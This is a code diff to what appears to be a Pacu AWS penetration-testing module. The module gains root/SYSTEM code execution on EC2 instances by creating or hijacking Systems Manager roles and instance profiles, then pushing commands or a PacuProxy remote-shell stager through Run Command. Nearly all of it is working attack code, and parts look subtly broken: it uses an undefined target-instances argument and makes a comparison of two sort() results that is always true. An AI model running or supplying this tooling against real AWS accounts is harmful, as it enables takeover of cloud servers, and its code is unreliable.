@@ -20,7 +20,7 @@ module_info = {
     'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',
 
     # Full description about what the module does and how it works
-    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it can\'t find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). By default, this module will execute a PacuProxy stager on the host to give you remote shell access, as well as a PacuProxy agent to route commands through.',
+    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it cannot find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). If PacuProxy is listening and no command argument is passed in, then by default, this module will execute a PacuProxy stager on the target hosts to get a PacuProxy agent to route commands through/give you shell access. Note: Linux targets will run the command using their default shell (bash/etc.) and Windows hosts will run the command using PowerShell, so be weary of that when trying to run the same command against both operating systems.',
 
     # A list of AWS services that the module utilizes during its execution
     'services': ['EC2'],
@@ -29,16 +29,16 @@ module_info = {
     'prerequisite_modules': ['enum_ec2'],
 
     # Module arguments to autocomplete when the user hits tab
-    'arguments_to_autocomplete': ['--target-os', '--all-instances', '--replace', '--ip-name', '--role-name'],
+    'arguments_to_autocomplete': ['--command', '--target-os', '--all-instances', '--replace', '--ip-name'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
+parser.add_argument('--command', required=False, default=None, help='The shell command to run on the targeted EC2 instances. If no command is specified AND PacuProxy is listening, the default will be to run a PacuProxy stager against each target')
 parser.add_argument('--target-os', required=False, default='All', help='This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All')
 parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
 parser.add_argument('--replace', required=False, default=False, action='store_true', help='For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had')
-parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile. Note: This argument takes priority over --role-name, so if both arguments are passed in, --role-name will be discarded')
-parser.add_argument('--role-name', required=False, default=None, help='The name of an existing "EC2 Role for Simple Systems Manager". If this argument is provided and --ip-name is not, this will skip the automatic role enumeration and the searching for a Systems Manager role and go straight to instance profile enumeration/searching')
+parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile')
 
 
 def help():
@@ -53,15 +53,24 @@ def main(args, pacu_main):
     args = parser.parse_args(args)
     print = pacu_main.print
     input = pacu_main.input
-    key_info = pacu_main.key_info
     fetch_data = pacu_main.fetch_data
     get_regions = pacu_main.get_regions
     ######
 
     # Make sure args.target_os equals one of All, Windows, or Linux
     if not (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows' or args.target_os.lower() == 'linux'):
-        print('Invalid option specified for the --target-os argument. Valid options include: All, Windows, or Linux. If --target-os is not specified, the default is All.')
+        print('Invalid option specified for the --target-os argument. Valid options include: All, Windows, or Linux. If --target-os is not specified, the default is All.\n')
         return
+
+    # Make sure --all-instances and --target-instances are not passed in together
+    if args.all_instances is True and args.target_instances is not None:
+        print('Invalid arguments received. Expecting one or zero of --all-instances and --target-instances, received both.\n')
+        return
+
+    # If no command was passed in and PacuProxy is listening, set the command to be executed to a PacuProxy stager
+    if args.command is None and proxy_settings.listening is True:
+        pp_windows_stager = pacu_main.get_stager('win')
+        pp_linux_stager = pacu_main.get_stager('lin')
 
     if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
         print('Pre-req module not run successfully. Exiting...')
@@ -71,11 +80,13 @@ def main(args, pacu_main):
     regions = get_regions('EC2')
 
     targeted_instances = []
-    ssm_instance_profile_name = ''
-    ssm_role_name = ''
+    if args.ip_name is not None:
+        ssm_instance_profile_name = args.ip_name
+    else:
+        ssm_instance_profile_name = ''
 
-    if args.all_instances is True:
-        # DryRun describe_images (don't need to DryRun this if args.all_instances is False)
+    if args.all_instances is False and args.target_instances is None:
+        # DryRun describe_images (don't need to DryRun this if args.all_instances is True)
         try:
             client = boto3.client(
                 'ec2',
@@ -139,137 +150,158 @@ def main(args, pacu_main):
                 print('  {} vulnerable images found.\n'.format(count))
         print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
     
-    # Begin Systems Manager role finder/creator
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
-
-    ssm_policy = client.get_policy(
-        PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
-    )['Policy']
-
-    if ssm_policy['AttachmentCount'] > 0:
-        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
-            print('Pre-req module not run successfully. Exiting...\n')
-            return
-        roles = session.IAM['Roles']
-
-        # For each role that exists in the account
-        for role in roles:
-            # For each AssumeRole statement
-            for statement in role['AssumeRolePolicyDocument']['Statement']:
-                # Statement->Principal could be a liist or a dict
-                if type(statement['Principal']) is list:
-                    # For each item in the list, check if ec2.amazonaws.com is in it
-                    for principal in statement['Principal']:
-                        if 'ec2.amazonaws.com' in principal:
-                            attached_policies = client.list_attached_role_policies(
-                                RoleName=role['RoleName'],
-                                PathPrefix='/service-role/'
-                            )['AttachedPolicies']
-                            # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
-                            for policy in attached_policies:
-                                if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
-                                    ssm_role_name = role['RoleName']
-                                    break
-                            if not ssm_role_name == '':
-                                break
-                    if not ssm_role_name == '':
-                        break
-                elif type(statement['Principal']) is dict:
-                    # For each key in the dict, check if it equal ec2.amazonaws.com
-                    for key in statement['Principal']:
-                        if statement['Principal'][key] == 'ec2.amazonaws.com':
-                            print(role['RoleName'])
-                            attached_policies = client.list_attached_role_policies(
-                                RoleName=role['RoleName']
-                            )['AttachedPolicies']
-                            print(attached_policies)
-                            # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
-                            for policy in attached_policies:
-                                print(policy['PolicyArn'])
-                                print(policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
-                                if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
-                                    ssm_role_name = role['RoleName']
-                                    break
-                            if not ssm_role_name == '':
-                                break
-                    if not ssm_role_name == '':
-                        break
-            if not ssm_role_name == '':
-                break
-    if ssm_role_name == '':
-        print('Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n')
-        try:
-            # Create the SSM role
-            create_response = client.create_role(
-                RoleName='SSM',
-                AssumeRolePolicyDocument='{"Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
-            )['Role']
-
-            ssm_role_name = create_response['RoleName']
-
-            # Attach the SSM policy to the role just created
-            attach_response = client.attach_role_policy(
-                RoleName=ssm_role_name,
-                PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
-            )
-            print('  Successfully created the required role: {}\n'.format(create_response['Arn']))
-        except Exception as error:
-            print('  Unable to create the required role: {}\n'.format(str(error)))
-            return
-    else:
-        print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...\n'.format(ssm_role_name))
-
-        # Find instance profile belonging to that role
-        response = client.list_instance_profiles_for_role(
-            RoleName=ssm_role_name,
-            MaxItems=1
+    if ssm_instance_profile_name == '':
+        # Begin Systems Manager role finder/creator
+        client = boto3.client(
+            'iam',
+            aws_access_key_id=session.access_key_id,
+            aws_secret_access_key=session.secret_access_key,
+            aws_session_token=session.session_token,
+            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
         )
 
-        if len(response['InstanceProfiles']) > 0:
-            ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
-            print('Found valid instance profile: {}.\n'.format(ssm_instance_profile_name))
-        # Else, leave ssm_instance_profile_name == ''
+        ssm_policy = client.get_policy(
+            PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
+        )['Policy']
 
-    # If no instance profile yet, create one with the role we have
-    if instance_profile == '':
-        # There is no instance profile yet
-        try:
-            # Create a new instance profile
-            ssm_instance_profile_name = client.create_instance_profile(
-                InstanceProfileName='SSM'
-            )['InstanceProfile']['InstanceProfileName']
+        if ssm_policy['AttachmentCount'] > 0:
+            if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
+                print('Pre-req module not run successfully. Exiting...\n')
+                return
+            roles = session.IAM['Roles']
 
-            # Attach our role to the new instance profile
-            client.add_role_to_instance_profile(
-                InstanceProfileName=ssm_instance_profile_name,
-                RoleName=ssm_role_name
+            # For each role that exists in the account
+            for role in roles:
+                # For each AssumeRole statement
+                for statement in role['AssumeRolePolicyDocument']['Statement']:
+                    # Statement->Principal could be a liist or a dict
+                    if type(statement['Principal']) is list:
+                        # For each item in the list, check if ec2.amazonaws.com is in it
+                        for principal in statement['Principal']:
+                            if 'ec2.amazonaws.com' in principal:
+                                attached_policies = client.list_attached_role_policies(
+                                    RoleName=role['RoleName'],
+                                    PathPrefix='/service-role/'
+                                )['AttachedPolicies']
+                                # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
+                                for policy in attached_policies:
+                                    if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
+                                        ssm_role_name = role['RoleName']
+                                        break
+                                if not ssm_role_name == '':
+                                    break
+                        if not ssm_role_name == '':
+                            break
+                    elif type(statement['Principal']) is dict:
+                        # For each key in the dict, check if it equal ec2.amazonaws.com
+                        for key in statement['Principal']:
+                            if statement['Principal'][key] == 'ec2.amazonaws.com':
+                                print(role['RoleName'])
+                                attached_policies = client.list_attached_role_policies(
+                                    RoleName=role['RoleName']
+                                )['AttachedPolicies']
+                                print(attached_policies)
+                                # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
+                                for policy in attached_policies:
+                                    print(policy['PolicyArn'])
+                                    print(policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
+                                    if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
+                                        ssm_role_name = role['RoleName']
+                                        break
+                                if not ssm_role_name == '':
+                                    break
+                        if not ssm_role_name == '':
+                            break
+                if not ssm_role_name == '':
+                    break
+        if ssm_role_name == '':
+            print('Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n')
+            try:
+                # Create the SSM role
+                create_response = client.create_role(
+                    RoleName='SSM',
+                    AssumeRolePolicyDocument='{"Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
+                )['Role']
+
+                ssm_role_name = create_response['RoleName']
+
+                # Attach the SSM policy to the role just created
+                attach_response = client.attach_role_policy(
+                    RoleName=ssm_role_name,
+                    PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
+                )
+                print('  Successfully created the required role: {}\n'.format(create_response['Arn']))
+            except Exception as error:
+                print('  Unable to create the required role: {}\n'.format(str(error)))
+                return
+        else:
+            print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...\n'.format(ssm_role_name))
+
+            # Find instance profile belonging to that role
+            response = client.list_instance_profiles_for_role(
+                RoleName=ssm_role_name,
+                MaxItems=1
             )
-        except Exception as error:
-            print('  Unable to create an instance profile: {}\n'.format(str(error)))
-            return
+
+            if len(response['InstanceProfiles']) > 0:
+                ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
+                print('Found valid instance profile: {}.\n'.format(ssm_instance_profile_name))
+            # Else, leave ssm_instance_profile_name == ''
+
+        # If no instance profile yet, create one with the role we have
+        if ssm_instance_profile_name == '':
+            # There is no instance profile yet
+            try:
+                # Create a new instance profile
+                ssm_instance_profile_name = client.create_instance_profile(
+                    InstanceProfileName='SSM'
+                )['InstanceProfile']['InstanceProfileName']
+
+                # Attach our role to the new instance profile
+                client.add_role_to_instance_profile(
+                    InstanceProfileName=ssm_instance_profile_name,
+                    RoleName=ssm_role_name
+                )
+            except Exception as error:
+                print('  Unable to create an instance profile: {}\n'.format(str(error)))
+                return
+
+    # If there are target instances passed in as arguments, fix instances and regions
+    if args.target_instances is not None:
+        instances = []
+        regions = []
+        if ',' in args.target_instances:
+            # Multiple instances passed in
+            split = args.target_instances.split(',')
+        else:
+            # Only one instance passed in
+            split = [args.target_instances]
+        for instance in split:
+            instance_at_region_split = instance.split('@')
+            instances.append({
+                'InstanceId': instance_at_region_split[0],
+                'Region': instance_at_region_split[1]
+            })
+            regions.append(instance_at_region_split[1])
+        # Kill duplicate regions
+        regions = list(set(regions))
 
     # Start attaching the instance profile to the vulnerable instances
-    client = boto3.client(
-        'ec2',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
-
-    print('Starting to attach the instance profile to vulnerable EC2 instances...\n')
+    print('Starting to attach the instance profile to target EC2 instances...\n')
     # args.replace is the static argument passed in from the user, but the
     # variable replace can be modified in cases where the call is failing,
     # likely due to permissions, but I give the user a choice below in the
     # error handling section
     replace = args.replace
     for region in regions:
+        client = boto3.client(
+            'ec2',
+            region_name=region,
+            aws_access_key_id=session.access_key_id,
+            aws_secret_access_key=session.secret_access_key,
+            aws_session_token=session.session_token,
+            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+        )
         # instances_to_replace will be filled up as each instance is checked for
         # each region. The describe_iam_instance_profile_associations API call
         # supports multiple instance IDs as filters, so by collecting a list and
@@ -278,7 +310,7 @@ def main(args, pacu_main):
         instances_to_replace = []
         for instance in instances:
             if instance['Region'] == region:
-                if args.all_instances is True or instance['ImageId'] in vuln_images:
+                if args.target_instances is not None or args.all_instances is True or instance['ImageId'] in vuln_images:
                     if 'IamInstanceProfile' in instance:
                         # The instance already has an instance profile attached, skip it if
                         # args.replace is not True, otherwise add it to instances_to_replace
@@ -390,6 +422,9 @@ def main(args, pacu_main):
                             if action == 'i':
                                 ignored_instances.append(instance[0])
                                 continue
+                            else:
+                                print('  Adding instance ID {} to list of targets.'.format(instance[0]))
+                                targeted_instances.append(instance[0])
                         if instance[1].lower() == 'windows':
                             windows_instances_to_attack.append(instance[0])
                         elif instance[1].lower() == 'linux':
@@ -406,7 +441,7 @@ def main(args, pacu_main):
                     DocumentName='AWS-RunPowerShellScript',
                     MaxErrors='100%',
                     Parameters={
-                        'commands': [shell_command if not shell_command == '' else pp_windows_stager]
+                        'commands': [shell_command if args.command is not None else pp_windows_stager]
                     }
                 )
                 this_check_attacked_instances.extend(windows_instances_to_attack)
@@ -419,17 +454,21 @@ def main(args, pacu_main):
                     DocumentName='AWS-RunShellScript',
                     MaxErrors='100%',
                     Parameters={
-                        'commands': [shell_command if not shell_command == '' else pp_linux_stager]
+                        'commands': [shell_command if args.command is not None else pp_linux_stager]
                     }
                 )
                 this_check_attacked_instances.extend(linux_instances_to_attack)
                 attacked_instances.extend(linux_instances_to_attack)
             
         print('{} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
+
+        if attacked_instances.sort() == targeted_instances.sort():
+            # All targeted instances have been attacked, stop polling every 30 seconds
+            break
         
         # Don't wait 30 seconds after the very last check
         if not i == 19:
-            print('Waiting 30 seconds...')
+            print('Waiting 30 seconds...\n')
             time.sleep(30)
 
     if i == 19:
